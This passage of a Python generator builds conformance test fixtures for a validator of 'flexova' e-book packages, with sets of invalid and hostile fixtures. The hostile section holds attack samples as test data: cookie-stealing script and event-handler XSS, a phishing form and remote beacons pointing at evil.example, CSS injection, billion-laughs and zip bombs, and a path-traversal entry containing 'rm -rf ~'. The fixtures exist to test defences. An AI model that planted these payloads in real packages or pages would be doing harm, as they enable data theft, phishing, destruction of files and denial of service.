@fixture("invalid", "manifest-size-mismatch", ["MAN_HASH_MISMATCH"], "A listed size is wrong.")
def _():
    def edit(m):
        for e in m["entries"]:
            if e["path"] == CH:
                e["size"] += 1
        return m
    return manifest_edit(edit)


@fixture("invalid", "manifest-entries-incomplete", ["MAN_ENTRIES_INCOMPLETE"], "An archive file is not listed.")
def _(): return manifest_edit(lambda m: {**m, "entries": [e for e in m["entries"] if e["path"] != "OEBPS/nav.xhtml"]})


# invalid: resources -----------------------------------------------------------------------------------
@fixture("invalid", "content-malformed", ["XML_MALFORMED"], "A content document is not well-formed.")
def _(): return pkg(chapters=[("01.xhtml", f'<html xmlns="{XHTML}" lang="en"><head><title>x</title></head><body><p>Unclosed</body></html>'.encode())]).build()


@fixture("invalid", "content-latin1-declaration", ["XML_ENCODING"], "The XML declaration names ISO-8859-1.")
def _(): return pkg(chapter_kw={"decl": '<?xml version="1.0" encoding="ISO-8859-1"?>\n'}).build()


@fixture("invalid", "content-invalid-utf8", ["XML_ENCODING"], "A content document contains bytes that are not UTF-8.")
def _(): return pkg(chapters=[("01.xhtml", xhtml("<p>café</p>").replace("é".encode(), b"\xe9"))]).build()


@fixture("invalid", "content-no-namespace", ["XML_WRONG_NAMESPACE"], "The html root is not in the XHTML namespace.")
def _(): return pkg(chapter_kw={"root": 'lang="en"'}).build()


@fixture("invalid", "content-external-doctype", ["XML_DTD_FORBIDDEN"], "An XHTML 1.1 doctype with an external DTD.")
def _(): return pkg(chapter_kw={"doctype": '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">\n'}).build()


@fixture("invalid", "css-import", ["CSS_UNSAFE"], "The stylesheet uses @import.")
def _(): return pkg(css=b"@import url(other.css);\nbody{margin:0}\n").build()


@fixture("invalid", "image-type-mismatch", ["ASSET_TYPE_MISMATCH"], "PNG bytes declared as image/jpeg.")
def _(): return pkg(chapters=[("01.xhtml", '<p><img src="../assets/photo.jpg" alt="x"/></p>')],
                    assets=[("assets/photo.jpg", "image/jpeg", PNG)]).build()


@fixture("invalid", "svg-wrong-root", ["XML_WRONG_NAMESPACE"], "An image/svg+xml file whose root is not svg.")
def _(): return pkg(chapters=[("01.xhtml", '<p><img src="../assets/x.svg" alt="x"/></p>')],
                    assets=[("assets/x.svg", "image/svg+xml", f'<html xmlns="{XHTML}"/>'.encode())]).build()


# invalid: content profile -----------------------------------------------------------------------------
@fixture("invalid", "unknown-element", ["PRF_UNKNOWN_ELEMENT"], "<div> is not part of the profile.")
def _(): return body("<div><p>Wrapped.</p></div>")


@fixture("invalid", "attribute-not-allowed", ["PRF_ATTRIBUTE_NOT_ALLOWED"], "class is not allowed (styling comes from tokens).")
def _(): return body('<p class="lead">Lead.</p>')


@fixture("invalid", "style-attribute", ["PRF_FORBIDDEN_ATTRIBUTE"], "Inline style attributes are forbidden.")
def _(): return body('<p style="color:red">Red.</p>')


@fixture("invalid", "invalid-dir", ["PRF_INVALID_VALUE"], "dir has an unknown value.")
def _(): return body('<p dir="sideways">Text.</p>')


@fixture("invalid", "invalid-id", ["PRF_INVALID_VALUE"], "An id that starts with a digit.")
def _(): return body('<p id="1st">Text.</p>')


@fixture("invalid", "text-in-section", ["PRF_CONTENT_MODEL"], "Bare text directly inside <section>.")
def _(): return body('<section id="s">Bare text.</section>')


@fixture("invalid", "block-in-paragraph", ["PRF_CONTENT_MODEL"], "A list inside a paragraph.")
def _(): return body("<p>Text <ul><li>item</li></ul></p>")


@fixture("invalid", "mixed-list-item", ["PRF_CONTENT_MODEL"], "A list item mixes text and a block.")
def _(): return body("<ul><li>Text <p>and a paragraph</p></li></ul>")


@fixture("invalid", "nested-links", ["PRF_CONTENT_MODEL"], "A link inside a link.")
def _(): return body('<p><a href="https://a.example/">a <a href="https://b.example/">b</a></a></p>')


@fixture("invalid", "table-without-tbody", ["PRF_CONTENT_MODEL"], "Rows directly inside <table>.")
def _(): return body('<table id="t"><tr><th>A</th></tr></table>')


@fixture("invalid", "figure-caption-only", ["PRF_CONTENT_MODEL"], "A figure with only a caption.")
def _(): return body('<figure id="f"><figcaption>Lonely caption</figcaption></figure>')


@fixture("invalid", "heading-without-id", ["PRF_MISSING_ATTRIBUTE"], "Headings need an id.")
def _(): return body("<h1>Title</h1>")


@fixture("invalid", "html-without-lang", ["PRF_MISSING_ATTRIBUTE"], "The html element needs lang.")
def _(): return pkg(chapter_kw={"root": f'xmlns="{XHTML}"'}).build()


@fixture("invalid", "lang-mismatch", ["PRF_INVALID_VALUE"], "lang and xml:lang disagree.")
def _(): return pkg(chapter_kw={"root": f'xmlns="{XHTML}" lang="en" xml:lang="fr"'}).build()


@fixture("invalid", "image-without-alt", ["PRF_MISSING_ALT"], "An image without alt.")
def _(): return with_icon('<p><img src="../assets/icon.png"/></p>')


@fixture("invalid", "duplicate-id", ["PRF_DUPLICATE_ID"], "Two elements share an id.")
def _(): return body('<p id="x">One.</p><p id="x">Two.</p>')


@fixture("invalid", "broken-fragment-link", ["PRF_BROKEN_LINK"], "A link to a missing fragment in the same document.")
def _(): return body('<p><a href="#nowhere">Nowhere</a></p>')


@fixture("invalid", "broken-cross-document-link", ["PRF_BROKEN_LINK"], "A link to a missing fragment in another document.")
def _(): return pkg(chapters=[("01.xhtml", '<p><a href="02.xhtml#nowhere">Nowhere</a></p>'), ("02.xhtml", "<p>Two.</p>")]).build()


@fixture("invalid", "broken-reference", ["PRF_BROKEN_REFERENCE"], "An image that is not in the package.")
def _(): return body('<p><img src="../assets/missing.png" alt="Missing"/></p>')


@fixture("invalid", "image-wrong-target", ["PRF_INVALID_VALUE"], "An img src that points to a stylesheet.")
def _(): return body('<p><img src="../styles/flexova.css" alt="Not an image"/></p>')


@fixture("invalid", "too-deep", ["PRF_TOO_DEEP"], "Elements nested deeper than the limit.")
def _(): return body("<p>" + "<span>" * 70 + "deep" + "</span>" * 70 + "</p>")


# hostile ------------------------------------------------------------------------------------------------
@fixture("hostile", "script-element", ["PRF_FORBIDDEN_ELEMENT"], "A <script> element.")
def _(): return body("<p>Hello.</p><script>alert(document.cookie)</script>")


@fixture("hostile", "iframe", ["PRF_FORBIDDEN_ELEMENT"], "An <iframe> to a remote page.")
def _(): return body('<iframe src="https://evil.example/"></iframe>')


@fixture("hostile", "inline-svg-script", ["PRF_FORBIDDEN_ELEMENT"], "Inline SVG carrying a script.")
def _(): return body(f'<p>x</p><svg xmlns="{SVGNS}"><script>alert(1)</script></svg>')


@fixture("hostile", "form-phishing", ["PRF_FORBIDDEN_ELEMENT"], "A password form posting to a remote site.")
def _(): return body('<form action="https://evil.example/login"><input type="password" name="p"/></form>')


@fixture("hostile", "base-element", ["PRF_FORBIDDEN_ELEMENT"], "<base> in head to redirect relative URLs.")
def _(): return pkg(chapter_kw={"head": '<base href="https://evil.example/"/>'}).build()


@fixture("hostile", "meta-refresh-in-body", ["PRF_ATTRIBUTE_NOT_ALLOWED", "PRF_CONTENT_MODEL", "PRF_MISSING_ATTRIBUTE"],
         "<meta http-equiv=refresh> in the body.")
def _(): return body('<meta http-equiv="refresh" content="0;url=https://evil.example/"/><p>x</p>')


@fixture("hostile", "event-handler", ["PRF_FORBIDDEN_ATTRIBUTE"], "An onerror handler on an image.")
def _(): return with_icon('<p><img src="../assets/icon.png" alt="x" onerror="alert(1)"/></p>')


@fixture("hostile", "xlink-attribute", ["PRF_FORBIDDEN_ATTRIBUTE"], "An xlink:href attribute in XHTML.")
def _(): return body('<p><span xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://evil.example/">x</span></p>')


@fixture("hostile", "javascript-link", ["PRF_INVALID_VALUE"], "A javascript: link.")
def _(): return body('<p><a href="javascript:alert(1)">Click</a></p>')


@fixture("hostile", "data-uri-image", ["PRF_INVALID_VALUE"], "An image from a data: URI.")
def _(): return body('<p><img src="data:image/png;base64,iVBORw0KGgo=" alt="x"/></p>')


@fixture("hostile", "tracking-pixel", ["PRF_REMOTE_RESOURCE"], "A remote image that would phone home.")
def _(): return body('<p><img src="https://tracker.example/p.gif" alt=""/></p>')


@fixture("hostile", "protocol-relative-resource", ["PRF_REMOTE_RESOURCE"], "A protocol-relative remote image.")
def _(): return body('<p><img src="//tracker.example/p.gif" alt=""/></p>')


@fixture("hostile", "svg-asset-script", ["ASSET_SVG_UNSAFE"], "An SVG image containing a script.")
def _(): return pkg(chapters=[("01.xhtml", '<p><img src="../assets/x.svg" alt="x"/></p>')],
                    assets=[("assets/x.svg", "image/svg+xml", f'<svg xmlns="{SVGNS}"><script>alert(1)</script></svg>'.encode())]).build()


@fixture("hostile", "svg-asset-onload", ["ASSET_SVG_UNSAFE"], "An SVG image with an onload handler.")
def _(): return pkg(chapters=[("01.xhtml", '<p><img src="../assets/x.svg" alt="x"/></p>')],
                    assets=[("assets/x.svg", "image/svg+xml", f'<svg xmlns="{SVGNS}" onload="alert(1)"/>'.encode())]).build()


@fixture("hostile", "svg-asset-external-image", ["ASSET_SVG_UNSAFE"], "An SVG image that loads a remote image.")
def _(): return pkg(chapters=[("01.xhtml", '<p><img src="../assets/x.svg" alt="x"/></p>')],
                    assets=[("assets/x.svg", "image/svg+xml",
                             f'<svg xmlns="{SVGNS}" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://evil.example/x.png"/></svg>'.encode())]).build()


@fixture("hostile", "css-remote-url", ["CSS_UNSAFE"], "A stylesheet beacon via url(https://...).")
def _(): return pkg(css=b'body{background:url("https://evil.example/beacon")}\n').build()


@fixture("hostile", "xml-entity-bomb", ["XML_DTD_FORBIDDEN"], "Billion-laughs entity expansion.")
def _():
    ents = '<!ENTITY a "aaaaaaaaaa">' + "".join(f'<!ENTITY {chr(98 + i)} "{("&" + chr(97 + i) + ";") * 10}">' for i in range(8))
    return pkg(chapter_kw={"doctype": f"<!DOCTYPE html [{ents}]>\n"}, chapters=[("01.xhtml", "<p>&i;</p>")]).build()


@fixture("hostile", "path-traversal", ["ZIP_UNSAFE_PATH"], "An entry named ../../evil.sh.")
def _(): return pkg(extra=[("../../evil.sh", b"rm -rf ~\n")]).build()


@fixture("hostile", "absolute-path", ["ZIP_UNSAFE_PATH"], "An entry with an absolute path.")
def _(): return pkg(extra=[("/etc/evil", b"x")]).build()


@fixture("hostile", "backslash-path", ["ZIP_UNSAFE_PATH"], "An entry using backslashes to traverse.")
def _(): return pkg(extra=[("OEBPS\\..\\..\\evil.sh", b"x")]).build()


@fixture("hostile", "zip-bomb", ["ZIP_RATIO_LIMIT"], "20 MB of zeros compressed about 1000:1.")
def _(): return pkg(extra=[("OEBPS/assets/zeros.bin", bytes(20_000_000))]).build()


@fixture("hostile", "declared-size-lie", ["ZIP_CORRUPT"], "An entry decompresses to more bytes than declared.")
def _(): return pkg().build(opts={CH: {"usize_delta": -16}})


@fixture("hostile", "entry-count-bomb", ["ZIP_TOO_MANY_ENTRIES"], "An end-of-central-directory record claiming 60,000 entries.")
def _(): return struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 60000, 60000, 0, 0, 0)


@fixture("hostile", "declared-size-overflow", ["ZIP_RATIO_LIMIT", "ZIP_SIZE_LIMIT"],
         "A tiny entry that declares 300 MB uncompressed (over the per-entry and total limits).")
def _(): return pkg().build(opts={CH: {"usize_delta": 300_000_000}})


@fixture("hostile", "token-css-injection", ["MAN_INVALID_TOKEN"], "A color token that tries to inject CSS.")
def _(): return set_token(accent={"light": "#000;}*{background:url(https://evil.example/)", "dark": "#7aa7ff"})


@fixture("hostile", "manifest-depth-bomb", ["MAN_INVALID"], "flexova.json nested 50,000 levels deep (parser stack exhaustion).")
def _():
    deep = b"[" * 50000 + b"]" * 50000
    return manifest_edit(lambda m: json.dumps({**m, "x-future": None}).encode().replace(b'"x-future": null', b'"x-future": ' + deep))


@fixture("hostile", "sealed-level", ["MAN_UNSUPPORTED_LEVEL"], "A sealed (L1) package opened by a core validator.")
def _(): return manifest_edit(lambda m: {**m, "level": "L1"})


# --- driver -------------------------------------------------------------------------------------------
def generate():
    outputs, expected = {}, {}
    for category, name, codes, description, builder, epubcheck in FIXTURES:
        for code in codes:
            assert code in ERRORS, f"{name}: unknown code {code}"
        rel = f"{category}/{name}.flexova"
        assert rel not in outputs, f"duplicate fixture {rel}"
        valid = not any(ERRORS[c]["severity"] == "error" for c in codes)
        assert valid == (category == "valid"), f"{rel}: category does not match expected validity"
        outputs[rel] = builder()
        expected[rel] = {"valid": valid, "codes": codes, "description": description}
        if valid:
            expected[rel]["epubcheck"] = epubcheck
    manifest = {
        "$comment": "Generated by conformance/generate.py. Every implementation must report exactly these codes (sorted, de-duplicated) for each fixture.",
        "fixtures": expected,
    }
    outputs["expected.json"] = (json.dumps(manifest, indent=2, ensure_ascii=False) + "\n").encode("utf-8")
    return outputs


def main():
    check = "--check" in sys.argv[1:]
    outputs = generate()
    stale = [p for c in ("valid", "invalid", "hostile") for p in sorted((HERE / c).glob("*.flexova"))
             if f"{c}/{p.name}" not in outputs] if all((HERE / c).exists() for c in ("valid", "invalid", "hostile")) else []
    drift = [rel for rel, data in outputs.items() if not (HERE / rel).exists() or (HERE / rel).read_bytes() != data]
    if check:
        if drift or stale:
            print("conformance fixtures are out of date; run: python3 conformance/generate.py")
            for rel in drift + [str(p.relative_to(HERE)) for p in stale]:
                print("  ", rel)
            sys.exit(1)
        print(f"conformance fixtures up to date ({len(outputs) - 1} fixtures)")
        return
    for p in stale:
        p.unlink()
    for rel, data in outputs.items():
        (HERE / rel).parent.mkdir(parents=True, exist_ok=True)
        (HERE / rel).write_bytes(data)
    counts = {c: sum(1 for f in FIXTURES if f[0] == c) for c in ("valid", "invalid", "hostile")}
    print(f"wrote {sum(counts.values())} fixtures {counts} and expected.json")


if __name__ == "__main__":
    main()
